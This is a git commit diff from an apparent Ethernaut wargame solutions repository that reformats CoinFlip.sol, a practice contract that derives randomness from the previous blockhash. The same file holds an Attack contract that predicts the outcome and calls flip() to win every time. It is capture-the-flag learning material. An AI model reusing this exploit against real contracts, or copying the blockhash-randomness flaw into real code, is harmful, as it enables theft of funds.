c6085c0fdee6d450ac59790753e40ae0a1a54221
Money Orientation Programming <zeroonechange@gmail.com>
2022-12-22 18:29:11 +0800

    ethernaut  20 - Alien Codex

--- ethernaut/contract/CoinFlip.sol
+++ ethernaut/contract/CoinFlip.sol
@@ -4,7 +4,8 @@ pragma solidity ^0.8.0;
 contract CoinFlip {
     uint256 public consecutiveWins;
     uint256 lastHash;
-    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    uint256 FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     constructor() {
         consecutiveWins = 0;
@@ -36,25 +37,23 @@ interface ICoinFlip {
 }
 
 contract Attack {
-
     function attackByInterface(address _addr) public {
-    
         bool side = getFlip();
 
         ICoinFlip(_addr).flip(side);
     }
 
-    // call 只推荐用于发送以太-在有fallback函数在情况下    其他情况下不推荐-也就是普通函数不推荐使用  但是也能用 
+    // call 只推荐用于发送以太-在有fallback函数在情况下    其他情况下不推荐-也就是普通函数不推荐使用  但是也能用
     function attackByCall(address _addr) public {
-        
         bool side = getFlip();
 
-       (bool sent , bytes memory data) = _addr.call(abi.encodeWithSignature("flip(bool)", side));
-       require(sent, "Failed to call function");   
+        (bool sent, bytes memory data) = _addr.call(
+            abi.encodeWithSignature("flip(bool)", side)
+        );
+        require(sent, "Failed to call function");
     }
 
-
-    function getFlip() private view returns (bool){
+    function getFlip() private view returns (bool) {
         uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
         uint256 blockValue = uint256(blockhash(block.number - 1));
         uint256 coinFlip = blockValue / FACTOR;
